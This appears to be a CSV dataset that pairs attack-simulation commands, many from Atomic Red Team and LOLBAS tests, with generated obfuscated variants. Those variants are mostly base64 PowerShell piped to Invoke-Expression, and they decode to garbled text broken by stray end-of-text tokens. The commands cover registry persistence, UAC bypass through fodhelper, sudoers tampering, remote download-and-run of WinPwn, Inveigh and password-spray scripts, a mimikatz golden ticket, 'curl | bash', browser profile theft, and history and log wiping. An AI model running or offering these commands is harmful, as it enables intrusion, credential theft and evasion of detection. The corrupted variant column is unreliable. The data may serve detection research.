"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, #{binary_to_execute}"" -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LW9uZVxkYXRhIC1BdXRob3JpdGllcyAje3tleSBjb3JlfSIgI3twb3N0IFNvZnR3YXJlIEFzc2VydmVyZ"
"wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u ""#{payload_path}""","wlrmdr.exe --s 3600 -f 0 -t _ -m _ -a 11 -u ""\""\""""\""\""\""^^""<|endoftext|"
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers","sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers sudo visudo -c -f /etc/sudoers"
"$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer""
$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""
if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFsAcwBlACIAYQB0AGEAdAB1AGUALQAtAEEASABFAFkATgBUAG4AUwBuAEIAXABTAFQARQBhAHIAVQBpAHoAIgAgAD0AOwAgADEAMgAzADk
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weXRvcnMgLWNvbW1hbmQgICAgZmVhdGVkIGJ5IEFjY2VzcyBmaWxlfSI=')) | Invoke-Expression"""
IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing),IEX (IWR https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1 -UseBasicParsing)
"docker build -t t1613 $PathtoAtomicsFolder/T1613/src/
docker run --name t1613_container --rm -d -t t1613
docker ps
docker stats --no-stream
docker inspect $(docker ps -l -q --filter ancestor=t1613)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YS5leGVjfQ==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value ""Atomic T1115 Test, grab data from clipboard via VBA""
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1115\src\T1115-macrocode.txt"" -officeProduct ""Word"" -sub ""GetClipboard""",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Set-Clipboard -value Atomic T1115 Test grab data from clipboard via VBA IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicPars
"for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFja2FnZXN9IC5jYWxsc3RhdHVzJyBzdWRvIGdldHRpbmcgL2ltYWdlcyAje2hvcCAtMTAuMTI=')) | Invoke-Expression""<|endoftext|"
sudo sysadminctl -guestAccount on,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN0YXJ0IC9wZW5jZyAje3BhdGhfc2luLWRldi1leGVjdXRl')) | Invoke-Expression"""
type {PATH_ABSOLUTE} > {PATH_SMB},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3Nvbm5pY2tlc1RlcmFfIHtleXMgLWxhbmd1YWdlfQ==')) | Invoke-Expression"" ||| ```"
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine,Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
"secedit /import /db #{secedit_db} /cfg ""#{ini_file}""
secedit /configure /db #{secedit_db}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NvbmZpYyB7dG9wIFtUb3RhbCBTaW1lcjEgL0JDQVFFSU5HX0hlcmU=')) | Invoke-Expression"""
"echo ""[Unit]"" > #{systemd_service_path}/#{systemd_service_file}
echo ""Description=Atomic Red Team Systemd Service"" >> #{systemd_service_path}/#{systemd_service_file}
echo """" >> #{systemd_service_path}/#{systemd_service_file}
echo ""[Service]"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""Type=simple""
echo ""ExecStart=#{execstart_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecStartPre=#{execstartpre_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecStartPost=#{execstartpost_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecReload=#{execreload_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecStop=#{execstop_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecStopPost=#{execstoppost_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo """" >> #{systemd_service_path}/#{systemd_service_file}
echo ""[Install]"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""WantedBy=default.target"" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBtYXJrIHRoaXMgL2dlbnByb3h5IC10ZXN0IGNvbnRlbnQ=')) | Invoke-Expression"""
"$key= ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\""
$name =""bad-subdomain""
new-item $key -Name $name -Force
new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;",$key = HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\^<clipboard>^^<clipboard>^^<clipboard>^ -Name bad-subdomain -Force new-item $key -Name bad-subdomain -Force new-item
"which_openssl=`which openssl`
$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}",which_openssl=$which openssl genrsa -out 744d95f0-e12c-46af-803b-5cfeb2ac12ba  2 $which_openssl rsa -in 744d95f0-e12c-46af-803b-5cfeb2ac1
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWR2aXNpcw==')) | Invoke-Expression"""
"Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" -Force -Recurse","Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination PathToAtomicsFolder\..\ExternalPayloads -Force -Recurse"
"touch #{target_file_path}
touch -acmr #{reference_file_path} #{target_file_path}","touch ""\""\<|\>endoftext|>tch"" -acmr \""\<|\>endoftext|>reference_file_path  target_file_path touch --command<|endof"
"odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2""
odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3BhcmFtZXRcUHJpbnRTdG9wIiAje1x0b2tlbg==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
mimiload -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwIGJldHN0YXR1czpjaGVjay5qcyAiU2VydmljZVBhcmFwaWwgLVByb3BlcnRzIC1MZXQgcHJvdmlkZXIgMTIzNDU2N"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWdlbnRpYyBGcmVzdCBQdWJsaWNLZXkxMjcuUmVhZC5leGVjdXRlTWljcm9zb2Z0XFByb3BlcnR5IFN0b3AtUmVhZ"
"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNvLmF3dC5leGUgJiAtIGlkPSZ2YWxpZG9zX1BlbGVtVGltZQ==')) | Invoke-Expression"""
"net user
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-localgroup
net localgroup",powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAGUAcgB0AC4AZABhAHIAaQBlAGwAdAApAC8AIAAkADoANwBiAGEAYwBlAC4AUwBzAGUALgBEAGwARQBUAEEAVABOAGkAdAB5AE8AIABPAG8Ab
attrib.exe -r #{file_or_folder}\*.* /s,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBQbGF0c3RyYXRAIiN7cmVzL2Jhc2gucHkiOiAje3ByaW9yaXR1ciIsICIgI3tmaWxlcy5sb2dpbiIKICN7dGVzdC"
"cat /etc/pam.d/system-auth
cat /etc/security/pwquality.conf","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWVudC5leGUgI3tmaXQgcHJvZmlsZSB7bmFtZT0iLCAjeDogICB1cmwi')) | Invoke-Expression"""
"reg add ""HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"" /ve /d ""C:\Windows\System32\calc.exe"" /f

reg add ""HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"" /ve /d "".pwn"" /f

echo Triggering fodhelper.exe for potential privilege escalation...
start fodhelper.exe","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRtaW5AZXhhbXBsZS5leGUubWFyay5zdWNjZXNz')) | Invoke-Expression"""
Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick,"Invoke-ATHHTMLApplication -ScriptEngine -SimulateUserDoubleClick -HTAFilePath """""
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29kZSBjbGllbnQgLXBhdGVtIC1zbGRlciAje3ByaW50OiN7dHJhYmVsIHBsdWNhdGlvbiAtIGFsaWFzIDwvdGhlcl9jaGFl"
"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIGlzIGEgLSAiZXhlIC1nYyAje2luZm9AdHJpbmcgMjEiICN7dXRpbC5leGVjdXRlfSI=')) | Invoke-"
"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value #{NEW_Remote_Port}
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QXByb2Nlc3MgLWdyYWRpdCAtIHJ1bnRpbWUucGwuZXhlIC9DcmVhdGVkfSIje2tleSBzYmFzZSAvTWljcm9zb2Z0fSkg"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""#{redirection_program}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBXcmFwb2xpbmluZyBlYm9zLlJlbWFpbCAtIFN1cnJlbnQgIiAvRW5naWxsZXJOdWNrZXRBbmRpY3QuIC0tIF"
"copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
schtasks /create /tn ExplorerSync /tr ""javaw -jar %temp%\..\Microsoft\ExplorerSync.db"" /sc MINUTE /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtaWRzLWNvbG9yOiN7YXBpIHtleSB0ZW1wbGF0ZTogJ2xhbmciICRjcmVhdGVkIEhlYWRlcmluZyB7dGltZ"
"rundll32 advpack.dll, RegisterOCX {CMD}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwLW1lcmNvbQ==')) | Invoke-Expression"" ||| rundll32 advpack.dll, RegisterOCX {CMD}"
fsutil usn deletejournal /D C:,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YVNldCAiSG93bmxvYWRfIiAtLW5hbWUgInRlc3QtX2JpbnQoICd1cmwgcHJvdmlk')) | Invoke-Expression"" ||| ```"
get-wmiObject -class Win32_Process,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdDEgLW5hbWUgIiAvZmVhdHVyZSAje21ldGFkYXRhIC90aGVtZSB7dmlzaWJsZCAtIGludCBleGUgaWNvbXBhbnkgcm"
"sudo nmap -sS #{network_range} -p #{port}
telnet #{host} #{port}
nc -nv #{host} #{port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB0aGUgL2JpdC9wbGFjZXM=')) | Invoke-Expression"""
"unset HISTFILE
export HISTFILESIZE=0
history -c","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFkb3Zjb2RlLW5hbWUgMiAtYXJncmlwdC1jICN7ZWNobyAje3ByaW9yaXRpZXIuZXhlfQ==')) | Invoke-Expression""<|endof"
"copy-item -Path ""\\#{remote}\C$\#{share_file}"" -Destination ""$Env:TEMP\#{local_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAiI3tmaWxlfSIgLXBhdGhkZXNjcmlwdCB7ICJzdHlsZT1wb3J0IFxuICJmcmFtZXMvbmV0aWNsZS5leGU='"
"rundll32 advpack.dll, RegisterOCX {CMD}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0cmluZyAtSGFzIlMgQWRkLm1lc3NhZ2VzICJQcm9ncmVzcyAiIHt7dHJpbXBsaWNhdGVfYm9vbGV"
ilasm.exe {PATH_ABSOLUTE:.txt} /dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0LmV4ZSAje1BsaXQgIHRoaXM=')) | Invoke-Expression"""
"pw adduser art -g wheel -s /bin/sh
echo ""password123"" | pw usermod art -h 0
su art
cd /tmp
curl -s #{remote_url} |bash","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3ByaW5nIGlzIHN0YXRlbWVudCAtLWNvbnN1bHRhdGUuZXhlICJyZWRpdCIsImxvY2FsaG9zdDoiMjQiLCJ"
"Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = ""#{domain_sid}""
If ($domain_sid -Match ""DEFAULT"") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt"" ""exit""

  echo.
  echo Requesting SYSVOL:
  dir \\#{domain}\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXh0ZW5kc3RyaWN0b3J5LUNlcnRpYmlsaXRhdGlvbnMuVHJhbnNpdGlvbiBjaGVjayAiUEFQSSAtIFN0dWRzIChXaWxsaW"
"Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmlsZSAiQ29weSAtMjAxNzoxLCAiUHJvamVjdFByb3BlcnR5fSBmcm9tIC1GaWxlc3BBbmFseXNl')) | Invoke-Expression""<|endoftext"
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path},"Invoke-ATHCompiledHelp -E""xecuteS""hortcutComma""nd"""" -Inf""oTechn""eStorag""eHan""dler -To""picEx""tension -HHFileP""ath"" -C""HMFilePa""th"
"$termsrvDll = ""C:\Windows\System32\termsrv.dll""

$ACL = Get-Acl $termsrvDll
$permission = ""Administrators"",""FullControl"",""Allow""
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL

Copy-Item -Path $termsrvDll -Destination ""$HOME\AtomicTest.dll""

$newServiceDll = ""$HOME\AtomicTest.dll""

$registryPath = ""HKLM:\System\CurrentControlSet\services\TermService\Parameters""

# Check if the registry key exists
if (Test-Path -Path $registryPath) {
    # Modify the ServiceDll value in the registry
    Set-ItemProperty -Path $registryPath -Name ""ServiceDll"" -Value $newServiceDll
    Write-Host ""ServiceDll value in the registry has been updated to: $newServiceDll""
} else {
    Write-Host ""Registry key not found. Make sure the 'TermService\Parameters' key exists.""
}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB7YXNhbGlvbiB9IG1haW50ZWQgJiAvZGVzIC9VcGRhdGVUcmFuc2luZyAnSFRlbXBsYWNlOjIwMTItMDMtMDE6NDp7Y"
"net groups ""Account Operators"" /doma
net groups ""Exchange Organization Management"" /doma
net group ""BUILTIN\Backup Operators"" /doma
net group /domai ""Domain Admins""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LXVzZXJuYW1lIiAvZnMgfSB7IC9Qb3dlclxleGFtcGxlIG5vdCBhdWRpbmciOw==')) | Invoke-Expression"""
"ssh localhost ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLXJlYWxseSB7ZGlyIC9wbHVnaW5z')) | Invoke-Expression"""
"set-WebConfigurationProperty -PSPath ""IIS:\Sites\#{website_name}\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true","set-WebConfigurationProperty -PSPath \""IIS:\""\""Sites\""\\""\""\""\""\""\""\""\""\""\""<|end"
"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\fodhelper.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNyb3ZpZXdTaW5nLVRlc3RTYXJ0eQoqIiAje2FsbGVucG1hbjogInBhdHRsZS5leGUiICJmaWxlbmFtZSA9IFsg"
tar -xf {PATH}:ads,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtZGVmYXVsdC5leGUgLXNlY3VyaXR5IC1zdHJpbmdoIiAvPiAje21vZHVsZSAvdiAjZCAvdjEucnVudGltZSE='"
"C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;#{command_to_execute}""","""C:\windows\system32\SyncAppvPublishingServer.vbs"" /n\;\""^<|endliteral|>^^""^^^^<|endoftext|"
"$ipAddr = ""#{ip_address}""
if ($ipAddr -like ""*,*"") {
    $ip_list = $ipAddr -split "",""
    $ip_list = $ip_list.ForEach({ $_.Trim() })
    Write-Host ""[i] IP Address List: $ip_list""

    $ports = #{port_list}

    foreach ($ip in $ip_list) {
        foreach ($port in $ports) {
            Write-Host ""[i] Establishing connection to: $ip : $port""
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host ""Port $port is open on $ip""
            }
        }
    }
} elseif ($ipAddr -notlike ""*,*"") {
    if ($ipAddr -eq """") {
        # Assumes the ""primary"" interface is shown at the top
        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
        Write-Host ""[i] Using Interface $interface""
        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
    }
    Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""
    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
    # Always assumes /24 subnet
    Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""

    $ports = #{port_list}
    $subnetIPs = 1..254 | ForEach-Object { ""$subnetSubstring$_"" }

    foreach ($ip in $subnetIPs) {
        foreach ($port in $ports) {
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host ""Port $port is open on $ip""
            }
        }
    }
} else {
    Write-Host ""[Error] Invalid Inputs""
    exit 1
}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgMCA9ICN7ZmllbGRzOiB7XCJcLyVtcHljQGNsb3VkID09')) | Invoke-Expression"""
"export ART='echo ""Atomic Red Team was here... T1059.004""'
echo $ART |/bin/sh","export ART='echo \""Atomic Red Team was here... T1059.004\""' echo $ART |/bin/sh"
"reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiUE9TVCAtIExJTlRBVEFURUxFRj4gI3twYXlsb2FkIE5ldyAjeW9uICN7aGVsbG8gLzEwMTAxMTc3ODI"
"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time",net stop w32time Copy-Item -Path $PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll -Destination C:\Users\Public\AtomicTest.dll reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer /t REG_SZ /v DllName /d C:\
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicPars"
"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAjIC9wYXRoICN7c3RhcnQgdGhlIGlzIHJvbmFsIHBvcnQgdmVydGVyLmF0b2xpYmluICNsaWtlU3RhdGlvbiAtcm"
"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpdmF0ZSAje2VwdGVtLWNhcm9uYXRldC5leGU=')) | Invoke-Expression"""
"$path = ""HKCU:\Software\Microsoft\Command Processor""
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""#{command}"" -PropertyType ""String""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7ZXN0IC1DdXBwbGllY29AZmlyc3QgPSAnYW5kIGVuZCBmb3IgcGFzayB0aGVyZSBmaWNlbnRlciBvbmVycm9yf"
"cd $HOME
curl -O #{remote_url}/art
curl -O #{remote_url}/gta.db
curl -O #{remote_url}/sqlite_dump.sh
chmod +x sqlite_dump.sh
find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWVudCAtIGlzIHRoZSBkIC1hbGwgcHJvamVjdCAiQmFzaWMgdGVzdCBpcyB0aGUgLXM=')) | Invoke-Expression"""
"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBmaWxlIC1iYXNlICR7aHVyLnBhcnQgfSBmcm9tIFJlbWFpbCBjYXRzOw==')) | Invoke-Expression"""
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0aHVtZSAje3Nzb25AbW9kdWxlfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
